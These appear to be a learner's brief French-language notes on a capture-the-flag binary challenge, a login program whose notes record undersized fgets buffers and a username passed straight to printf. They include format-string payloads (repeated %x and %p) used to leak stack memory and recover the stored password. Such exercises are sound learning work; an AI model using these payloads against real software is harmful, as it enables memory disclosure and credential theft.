3 buffer set to 0

file = password file.

buffer_6 store the password

username : fgets de 100 dans un buffer de 12
replace \n par \0

password  : fgets de 100 dans buffer de 14
replace le \n par \0

si je donne le mot de passe ca me spawn un shell (on s'en fout)

printf(buffer_12) (celui du username...)

===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
--[ Password: CCCC

AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p